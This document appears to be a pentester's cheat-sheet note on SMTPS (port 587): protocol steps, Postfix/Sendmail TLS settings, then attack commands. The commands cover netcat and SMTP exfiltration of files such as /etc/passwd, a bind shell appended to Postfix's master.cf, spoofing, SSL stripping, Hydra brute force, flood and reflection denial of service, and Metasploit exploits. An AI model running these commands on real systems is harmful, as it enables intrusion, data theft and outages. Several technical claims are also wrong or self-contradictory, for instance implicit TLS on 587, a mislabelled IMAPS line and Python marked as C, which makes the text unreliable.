# Index
- [[Ports, Protocols, and Services]]
	- [[P25 SMTP]]

# Simple Mail Transfer Protocol Secure (SMTPS)

- **Port Number:** 587
- **Protocol:** TCP
- **Service Name:** SMTPS (Simple Mail Transfer Protocol Secure)
- **Defined in:** RFC 8314 (Modern Email, STARTTLS), RFC 2487 (SMTP Service Extension for Secure SMTP over TLS)

Simple Mail Transfer Protocol Secure (SMTPS) is an extension of the standard SMTP (Simple Mail Transfer Protocol) that operates over a secure TLS/SSL connection. It is designed to securely transfer emails between servers, ensuring the confidentiality and integrity of the messages. SMTPS initially gained popularity because of its ability to encrypt email traffic, preventing unauthorized access and tampering.

## Overview of Features

- **Secure Transmission:** SMTPS encrypts the SMTP communication channel using TLS/SSL, ensuring that email messages and credentials are protected during transit.

- **TCP-Based:** SMTPS operates over the TCP protocol, providing reliable, connection-oriented communication.

- **Authentication:** SMTPS typically requires authentication before sending emails, ensuring that only authorized users can relay messages through the server.

- **Backward Compatibility:** SMTPS is often used alongside STARTTLS, allowing for both encrypted and unencrypted SMTP communication over the same port.

## Typical Use Cases

- **Email Encryption:** Ensuring that email communications between servers and clients are encrypted to protect sensitive information.
  
- **Secure Email Relay:** Allowing trusted clients to relay emails securely through a mail server.
  
- **Preventing Man-in-the-Middle (MITM) Attacks:** Using SMTPS to prevent MITM attacks by encrypting the email traffic between servers and clients.

- **Compliance with Security Policies:** Ensuring that email communications comply with organizational or regulatory security requirements, which often mandate encryption.

## How SMTPS Works

1. **Connection Establishment:**
   - **Step 1:** The client initiates a TCP connection to the mail server on port 587.
   - **Step 2:** A TLS/SSL handshake begins, where the server presents its digital certificate to the client for verification.
   - **Step 3:** The client verifies the server’s certificate against a trusted certificate authority (CA). If the certificate is valid, the client proceeds with the connection.
   - **Step 4:** A secure TLS/SSL channel is established, and all further communication is encrypted.

2. **SMTP Communication:**
   - **Step 5:** The client sends an EHLO command to the server, identifying itself and requesting the server’s capabilities.
   - **Step 6:** The server responds with its capabilities, including supported authentication methods.
   - **Step 7:** The client initiates authentication (if required), typically using methods like PLAIN, LOGIN, or CRAM-MD5.
   - **Step 8:** Once authenticated, the client can send emails by issuing MAIL FROM, RCPT TO, and DATA commands, all within the secure channel.

3. **Email Transmission:**
   - **Step 9:** The client sends the email data (headers, body, attachments) to the server.
   - **Step 10:** The server processes the email and relays it to the recipient’s mail server or delivers it locally, all while maintaining the secure TLS/SSL connection.

4. **Connection Termination:**
   - **Step 11:** Once all emails have been transmitted, the client sends a QUIT command.
   - **Step 12:** The server acknowledges the QUIT command and closes the TLS/SSL connection, terminating the session.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `<target_ip>`:587.
- **Server:** `<target_ip>` presents a certificate, and a secure TLS/SSL channel is established.
- **Client:** `<attack_ip>` sends an email securely, which the server then processes and delivers.

# Additional Information

## Security Considerations
- **Certificate Validation:** Proper certificate validation is critical to prevent MITM attacks. If the client does not correctly validate the server’s certificate, the secure connection could be compromised.

- **Legacy vs. Modern Usage:** SMTPS on port 587 is considered somewhat of a legacy implementation. Modern practices encourage using STARTTLS on port 587 or port 25, allowing for a more flexible approach where the connection can upgrade to TLS after the initial handshake.

- **Compatibility Issues:** Some legacy systems and email clients may still rely on SMTPS on port 587, which can lead to compatibility issues with modern mail servers that prefer STARTTLS on other ports.

## Alternatives
- **STARTTLS on Port 587:** The preferred method for securing SMTP communication, where the connection begins unencrypted on port 587 but can be upgraded to TLS using the STARTTLS command.
  
- **SMTP over Port 25 with STARTTLS:** Another alternative where traditional SMTP traffic on port 25 can be upgraded to a secure channel using STARTTLS.

## Modes of Operation
- **Implicit TLS:** SMTPS operates with implicit TLS, meaning that the entire connection is encrypted from the start, without requiring a STARTTLS command.
  
- **Explicit TLS (STARTTLS):** Unlike SMTPS, STARTTLS begins with an unencrypted connection that is later upgraded to TLS.

## Configuration Files

1. **Postfix** (Popular SMTP Server):
   - **File Location:** `/etc/postfix/main.cf`
   - **Configuration Example:**
     ```bash
     smtpd_tls_cert_file=/etc/ssl/certs/your_domain.crt
     smtpd_tls_key_file=/etc/ssl/private/your_domain.key
     smtpd_tls_security_level=may
     smtpd_tls_auth_only=yes
     smtpd_tls_loglevel=1
     smtpd_tls_received_header=yes
     smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
     smtpd_recipient_restrictions=permit_sasl_authenticated,permit_mynetworks,reject_unauth_destination
     ```
   - **Key Settings:**
     - `smtpd_tls_cert_file`: Path to the server’s SSL/TLS certificate.
     - `smtpd_tls_key_file`: Path to the private key corresponding to the certificate.
     - `smtpd_tls_security_level`: Sets the minimum security level for TLS (e.g., `may`, `encrypt`).
     - `smtpd_recipient_restrictions`: Defines restrictions on who can send emails through the server, with authentication and network-based rules.

2. **Sendmail:**
   - **File Location:** `/etc/mail/sendmail.mc`
   - **Configuration Example:**
     ```bash
     define(`CERT_DIR', `/etc/ssl/certs')
     define(`confCACERT_PATH', `CERT_DIR')
     define(`confSERVER_CERT', `CERT_DIR/your_domain.crt')
     define(`confSERVER_KEY', `CERT_DIR/your_domain.key')
     define(`confCLIENT_CERT', `CERT_DIR/your_domain.crt')
     define(`confCLIENT_KEY', `CERT_DIR/your_domain.key')
     ```
   - **Key Settings:**
     - `confSERVER_CERT`: Path to the server certificate.
     - `confSERVER_KEY`: Path to the server private key.
     - `confCACERT_PATH`: Path to the directory containing CA certificates for validating client certificates.

## Potential Misconfigurations

1. **Incorrect Certificate Setup:**
   - **Risk:** If the certificate or private key is incorrectly configured, the server may fail to establish secure connections, leading to a fallback to unencrypted communication or a total failure of the SMTPS service.
   - **Exploitation:** An attacker could exploit this misconfiguration to intercept unencrypted emails or execute a MITM attack.

2. **Weak TLS Versions:**
   - **Risk:** Allowing outdated TLS versions (e.g., TLS 1.0, 1.1) or weak cipher suites can expose the server to vulnerabilities like POODLE or BEAST.
   - **Exploitation:** An attacker could force the server to downgrade to a weaker version of TLS and exploit known vulnerabilities to decrypt the communication.

3. **Improper Authentication Settings:**
   - **Risk:** Misconfiguring the server to allow anonymous relaying can turn it into an open relay, allowing spammers to send unsolicited emails.
   - **Exploitation:** Attackers can exploit open relays to distribute spam or malicious emails, leading to the server being blacklisted.

## Default Credentials

SMTPS typically requires authentication before allowing email relaying. Default credentials are not associated with SMTPS itself but with the underlying mail server. It's important to ensure that default usernames and passwords for email accounts are changed.

- **Common Default Credentials:**
  - **Username:** `admin`
  - **Password:** `password` (commonly used default)
  
- **Risk:** Using default credentials can allow unauthorized access to the mail server, potentially leading to email account hijacking or unauthorized email relaying.

# Interaction and Tools

## Tools

### [[SMTP]]
- **EHLO (Extended SMTP):** Introduces the client to the server and requests a list of supported extensions.
	```bash
	EHLO <hostname>
	```
- **MAIL FROM:** Specifies the sender’s email address.
	```bash
	MAIL FROM:<sender@example.com>
	```
- **RCPT TO:** Specifies the recipient’s email address.
	```bash
	RCPT TO:<recipient@example.com>
	```
- **DATA:** Indicates the start of the email content. The email body is terminated with a single line containing only a period (`.`).
	```bash
	DATA
	```
- **QUIT:** Terminates the SMTP session.
	```bash
	QUIT
	```
- **VRFY (Verify):** Requests verification of an email address or username on the server. This command is often disabled to prevent information disclosure.
	```bash
	VRFY <username>
	```
- **EXPN (Expand):** Requests a list of recipients for a mailing list. Like VRFY, this command is often disabled to prevent information disclosure.
	```bash
	EXPN <mailing-list>
	```
- **RSET (Reset):** Resets the current mail transaction, allowing the client to start a new one without terminating the connection.
	```bash
	RSET
	```
- **AUTH (Authentication):** Initiates the SMTP authentication process. The server typically responds with a prompt for the username and password, which are base64 encoded.
	```bash
	AUTH LOGIN
	```
- **STARTTLS:** Requests the server to upgrade the connection to a secure TLS-encrypted connection.
	```bash
	STARTTLS
	```
- **Example SMTP Session:**
	```bash
	telnet <target_ip> 25
	EHLO example.com
	MAIL FROM:<user@example.com>
	RCPT TO:<recipient@example.com>
	DATA
	Subject: Test Email

	This is a test email.
	.
	QUIT
	```

### [[Telnet]]
- **Telnet Connect:** Telnet can be used to manually interact with an SMTP server, sending commands and receiving responses.
    ```bash
    telnet <target_ip> 25
    ```

### [[Stunnel]]
- **Create a Secure Tunnel:** Creating secure tunnels for services like SMTPS, allowing you to connect to them via tools like Telnet or NetCat.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:587
    ```
- **Telnet via Stunnel (for SMTPS):** Creates a secure tunnel using Stunnel and then connects to it via Telnet, simulating an SMTPS connection.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:587
    telnet 127.0.0.1 587
    ```

### [[OpenSSL]]
- **SMTP Connect:**
	```bash
	openssl s_client -starttls smtp -connect <target_ip>:587
	```

### [[cURL]]
- **Connect to IMAPS with username and password:**
	```bash
	curl -k 'smtps://<target_ip>' --user <username>:<password>
	```
- **Use Verbose to dump additional information on the connection:**
	```bash
	curl -k 'smtps://<target_ip>' --user <username>:<password> -v
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 587"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 587
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 587
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 587 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 587
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 587 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:587
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 587 -c 1
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:587
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:587
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 587
	```

### [[SMTP-User-Enum]]
  - **Enumeration:** Enumerating valid email addresses or usernames on a target SMTP server by exploiting the `VRFY` and `EXPN` commands.
    ```bash
    smtp-user-enum -M VRFY -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M EXPN -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M RCPT -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M VRFY -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    ```

## Other Techniques

### SMTPS via Email Clients
- **Description:** Leverage GUI email clients to access SMTP.
	- **[[Evolution]]**
	- **[[Thunderbird]]**
	- **[[Microsoft Outlook]]**

### Sending Email via Custom Script
- **Tool:** [[Custom Scripts]]
    ```bash
    echo -e "EHLO domain.com\r\nAUTH LOGIN\r\n$(echo -n 'username' | base64)\r\n$(echo -n 'password' | base64)\r\nMAIL FROM:<user@domain.com>\r\nRCPT TO:<recipient@domain.com>\r\nDATA\r\nSubject: Test\r\nThis is a test message.\r\n.\r\nQUIT\r\n" | openssl s_client -connect <target_ip>:587 -crlf
    ```

	```c
	import smtplib
	from email.mime.text import MIMEText
	
	msg = MIMEText('This is a test email')
	msg['Subject'] = 'Test'
	msg['From'] = 'sender@example.com'
	msg['To'] = 'recipient@example.com'
	
	with smtplib.SMTP_SSL('<target_ip>', 465) as server:
	    server.login('user', 'password')
	    server.sendmail('sender@example.com', 'recipient@example.com', msg.as_string())
	```

### Email Spoofing
- **Description:** Sending emails with forged sender addresses.
    - Use a misconfigured SMTP server to send spoofed emails.
    - Example command:
	```bash
	telnet <target_ip> 25
	HELO example.com
	MAIL FROM:<spoofed@example.com>
	RCPT TO:<victim@example.com>
	DATA
	Subject: Spoofed Email
	This email appears to come from a legitimate source.
	.
	QUIT
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 587
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 587
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### SMTP Enumeration
- **Tool:** [[SMTP-User-Enum]]
    ```bash
    smtp-user-enum -M VRFY -U users.txt -t <target_ip>
    ```
- **Description:** Enumerates valid users on the SMTP server by exploiting commands like `VRFY` and `EXPN`.

### Certificate Information Gathering
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:587 -showcerts
    ```
- **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 25"
    
    sslstrip -l 587
    ```
- **Description:** Capture traffic and extract plaintext credentials (if STARTTLS is not used).

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
    ```bash
    bettercap -T <target_ip> --proxy --proxy-https --proxy-smtp
    ```
- **Description:** Perform a MITM attack to intercept credentials sent over SMTPS, exploiting weak SSL/TLS configurations.

### SSL Strip Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    
    sslstrip -l 587
    ```
- **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

## Privilege Escalation

### Exploiting Misconfigured SMTP Permissions
- **Tool:** [[Custom Scripts]]
    ```bash
    echo 'nc -lvp 4444 -e /bin/bash' >> /etc/postfix/master.cf
    ```
- **Description:** Modifies SMTP configuration files or scripts to escalate privileges on the server.

## Internal Reconnaissance

### Identifying Internal Mail Servers
- **Tool:** [[Nmap]]
    ```bash
    nmap <internal_ip_range> -p 25,587 -sV --script=smtp-commands
    ```
- **Description:** Scans the internal network to identify and enumerate SMTP servers and their configurations.

## Lateral Movement, Pivoting, and Tunnelling

### SMTP Pivoting
- **Tool:** [[SSH]], [[NetCat]]
    ```bash
    ssh -L 587:<target_ip>:25 <intermediate_host>
    ```
- **Description:** Uses an intermediate host to pivot through SMTP services for lateral movement within the network.

## Defense Evasion

### Obfuscating SMTP Headers
- **Tool:** [[Custom Scripts]], [[Email Clients]]
    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<spoofed@example.com>\nRCPT TO:<victim@example.com>\nDATA\nSubject: Test\nX-Header: Obfuscated\n.\nQUIT" | nc <target_ip> 587
    ```
- **Description:** Injects custom headers into emails to evade detection by security mechanisms.

### SSL/TLS Inspection Evasion
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:587 -cipher "HIGH:!aNULL:!MD5"
    ```
- **Description:** Using strong ciphers to evade SSL/TLS inspection mechanisms that might otherwise detect malicious activity.

## Data Exfiltration

### Exfiltrating Data via SMTP
- **Tool:**[[ Custom Scripts]], [[NetCat]]
    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<attacker@example.com>\nRCPT TO:<attacker@example.com>\nDATA\nSubject: Exfiltration\n\n$(cat /etc/passwd)\n.\nQUIT" | nc <target_ip> 25
    ```
- **Description:** Sends sensitive data through SMTP emails to an external address, bypassing traditional file transfer monitoring.

### Exfiltrating Data via Email
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "Subject: Exfil Data\r\n\r\nSensitive information." | openssl s_client -connect <target_ip>:587 -crlf
    ```
- **Description:** Sending sensitive data out of the network via SMTPS, ensuring it remains encrypted and less likely to be detected.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 587 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 587 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 587 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 587 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### SSL/TLS Handshake Flood
- **Tool:** [[OpenSSL]]
     ```bash
     while true; do openssl s_client -connect <target_ip>:587 & done
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 587 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 587 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 587 <target_ip>
	```
- **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

### SSL/TLS Downgrade Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
     ```bash
     bettercap -iface <interface> -T <target_ip> --proxy
     
     sslstrip -l 587
     ```
- **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

### SMTPS Command Injection
- **Tool:** [[Metasploit]]
    ```bash
    msfconsole
    use exploit/unix/smtp/exim4_string_format
    set RHOST <target_ip>
    set RPORT 587
    exploit
    ```
- **Description:** Exploiting format string vulnerabilities in older mail servers to execute arbitrary commands with elevated privileges.

### Buffer Overflow in SMTPS Daemon
- **Tool:** [[Metasploit]]
    ```bash
    msfconsole
    use exploit/linux/smtp/sendmail_buffer_overflow
    set RHOST <target_ip>
    set RPORT 587
    exploit
    ```
- **Description:** Targeting a buffer overflow vulnerability in a specific SMTPS daemon to execute arbitrary code or gain control of the server.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 8314 (STARTTLS)|https://tools.ietf.org/html/rfc8314|
|Nmap Script Engine for SMTP|https://nmap.org/nsedoc/scripts/smtp-enum-users.html|
|Hydra Password Cracker|https://github.com/vanhauser-thc/thc-hydra|
|Stunnel Official Site|https://www.stunnel.org/|
|OpenSSL Documentation|https://www.openssl.org/docs/man1.1.1/|
|Wireshark Official Site|https://www.wireshark.org/|
|Metasploit Framework|https://www.metasploit.com/|
|Sendmail Configuration Guide|https://www.sendmail.com/sm/open_source/docs/m4/sendmail_doc.pdf|
|Postfix TLS Configuration|http://www.postfix.org/TLS_README.html|
|hping3 Manual|http://www.hping.org/manpage.html|